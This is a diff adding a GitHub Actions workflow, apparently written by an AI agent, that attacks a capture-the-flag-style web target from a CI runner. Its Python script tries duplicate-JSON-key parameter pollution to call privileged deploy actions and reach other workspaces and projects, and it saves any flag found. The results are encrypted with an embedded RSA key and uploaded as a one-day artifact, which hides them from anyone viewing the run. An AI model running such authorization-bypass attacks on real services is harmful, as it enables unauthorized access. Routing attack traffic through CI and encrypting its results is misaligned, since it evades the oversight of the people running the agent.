@@ -1,0 +1,79 @@
+name: launchlet-part3-jsondup
+
+on:
+  push:
+    branches: [agent/launchlet-part3-jsondup-20260808]
+
+permissions:
+  contents: read
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 4
+    steps:
+      - name: Probe duplicate JSON keys and encrypt anomalies
+        shell: bash
+        run: |
+          set -euo pipefail
+          umask 077
+          mkdir -p package/out
+          cat > package/public.pem <<'PEM'
+          -----BEGIN PUBLIC KEY-----
+          MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlOxaJs92lwtrdk6J2LR9
+          QeyG3A5H0rzGOQHw80MWPcOeEs5pzn37ilHloXnTkGk4PmJU67C06N9OOsgqU1kF
+          iydiljdl6RfwF/OSjMsNfRYsyBr1wONeO+9f+72VjLlNWqWVll2qeczrxppOulhJ
+          r+qBx95tdasvdCgh7aTShlkXF7e9+JjK19MrG+Lyj+I7B6bbTsp7D+PiJMlpepWk
+          hoz0jBO8Rgtodz7i/+9Z3RVVhqREdK3uA0Va5ia57Gp3hlvQGbjGxE6TC7q4s1/p
+          q6VF10bVOx8kwE2KggVgsX3uudJlzSvHV3f1coMdwyTSALsAjvAlZQwSts3eHjnF
+          SQIDAQAB
+          -----END PUBLIC KEY-----
+          PEM
+          python3 - <<'PY'
+          import requests,json,pathlib,re
+          base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru/'
+          out=pathlib.Path('package/out'); s=requests.Session(); s.headers['User-Agent']='Mozilla/5.0'
+          boot=s.get(base+'api/app/bootstrap',timeout=15).json(); refs=s.get(base+boot['api']['serverReferences'].lstrip('/'),timeout=15).json(); a=refs['serverActions']['inspectDeploy']; url=base+a['endpoint'].lstrip('/')
+          h={'Accept':'application/json','Content-Type':'application/json','X-Launchlet-Preview':boot['project'],'apikey':boot['client']['anonKey'],'Authorization':'Bearer '+boot['client']['session']}
+          known=a['id']; sem=['exportDeploy','deployExport','publishDeploy','releaseDeploy','promoteDeploy','approveDeploy','finalizeDeploy','enterpriseDeploy','corporateRelease','exportRelease','releaseExport','inspectRelease','inspectProduction','productionDeploy','publishRelease','promoteRelease','deploySecrets','exportProduction']
+          results=[]
+          def send(name,raw):
+            try:r=s.post(url,headers=h,data=raw.encode(),timeout=10)
+            except Exception as e: results.append({'name':name,'raw':raw,'error':repr(e)}); return
+            results.append({'name':name,'raw':raw,'status':r.status_code,'body':r.text,'headers':dict(r.headers)})
+            if re.search(r'caplag\{[^}]+\}',r.text): (out/'FOUND.txt').write_text(r.text)
+          # baseline
+          send('baseline',json.dumps({'actionId':known,'args':{'workspaceId':boot['workspace'],'projectId':boot['project']}}))
+          for x in sem:
+            # known first / semantic last, and reverse
+            send('action_known_first_'+x,'{"actionId":"'+known+'","actionId":"'+x+'","args":{"workspaceId":"'+boot['workspace']+'","projectId":"'+boot['project']+'"}}')
+            send('action_known_last_'+x,'{"actionId":"'+x+'","actionId":"'+known+'","args":{"workspaceId":"'+boot['workspace']+'","projectId":"'+boot['project']+'"}}')
+          vals=['ws-launchlet-internal','ws-launchlet-enterprise','ws-launchlet-production','ws-enterprise-rollout','ws-release-pulse','ws-deploy-inspector']
+          projects=['enterprise-rollout','release-pulse','production-readiness','deploy-inspector','launchlet-enterprise','launchlet-production','launchlet-release']
+          for ws in vals:
+            raw='{"actionId":"'+known+'","args":{"workspaceId":"'+ws+'","workspaceId":"'+boot['workspace']+'","projectId":"'+boot['project']+'"}}'
+            send('ws_first_'+ws,raw)
+            raw='{"actionId":"'+known+'","args":{"workspaceId":"'+boot['workspace']+'","workspaceId":"'+ws+'","projectId":"'+boot['project']+'"}}'
+            send('ws_last_'+ws,raw)
+          for p in projects:
+            raw='{"actionId":"'+known+'","args":{"workspaceId":"'+boot['workspace']+'","projectId":"'+p+'","projectId":"'+boot['project']+'"}}'
+            send('project_first_'+p,raw)
+            raw='{"actionId":"'+known+'","args":{"workspaceId":"'+boot['workspace']+'","projectId":"'+boot['project']+'","projectId":"'+p+'"}}'
+            send('project_last_'+p,raw)
+          (out/'summary.json').write_text(json.dumps(results,indent=2))
+          PY
+          tar -C package/out -czf package/result.tgz .
+          openssl rand 32 > package/aes.key; openssl rand 16 > package/iv.bin
+          KEY_HEX="$(xxd -p -c 256 package/aes.key)"; IV_HEX="$(xxd -p -c 256 package/iv.bin)"
+          openssl enc -aes-256-cbc -K "$KEY_HEX" -iv "$IV_HEX" -in package/result.tgz -out package/result.enc
+          openssl pkeyutl -encrypt -pubin -inkey package/public.pem -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in package/aes.key -out package/key.enc
+          mkdir -p artifact
+          base64 -w0 package/result.enc > artifact/result.enc.b64
+          base64 -w0 package/key.enc > artifact/key.enc.b64
+          base64 -w0 package/iv.bin > artifact/iv.bin.b64
+          rm -rf package
+      - uses: actions/upload-artifact@v4
+        with:
+          name: launchlet-part3-jsondup-encrypted
+          path: artifact/
+          retention-days: 1
